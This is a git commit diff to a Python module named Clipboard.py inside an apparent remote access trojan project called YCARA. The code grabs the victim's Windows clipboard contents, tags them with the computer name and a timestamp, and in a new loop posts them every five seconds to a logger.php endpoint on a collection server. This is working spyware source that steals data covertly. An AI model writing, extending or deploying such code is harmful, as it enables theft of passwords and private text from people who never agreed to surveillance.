a94d79aa2f9551cbb461a66f0ae508d16f699ba3
cuicuiasoupe <47559325+cuicuiasoupe@users.noreply.github.com>
2019-02-14 14:28:54 +0100

    Update Clipboard.py

--- YCARA/RAT/Clipboard.py
+++ YCARA/RAT/Clipboard.py
@@ -5,13 +5,13 @@ import requests
 import time
 import os
 
-
 def get_clip():
     # Variables
+    global data
+    global donnees
     date = time.strftime("%Y%m%d_%H%M%S")
     pc_name = os.environ['COMPUTERNAME']
     clip_name = pc_name + "_" + date + '\n'
-    global donnees
     # Ouverture du Clipboard
     clip.OpenClipboard()
     # Récupération du contenu du clipboard
@@ -19,14 +19,21 @@ def get_clip():
     # Fermeture du clipboard pour ne pas impacter la fonction
     clip.CloseClipboard()
     donnees = (clip_name + data).replace('\n', '|| ')
-    return donnees
 
-def send(f):
+def send(donnees):
     # AVEC REQUESTS
     url = 'http://192.168.35.68:8080/logger.php?log='
     url_log = url + donnees
     res = requests.post(url_log, data=donnees.decode("utf-8"))
     print(res.text)
 
+def main():
+    while True:
+        get_clip()
+        data_sent = ''
+        if data != data_sent :
+            send(donnees)
+            data_sent = data
+        time.sleep(5)
 
-send(get_clip())
+main()
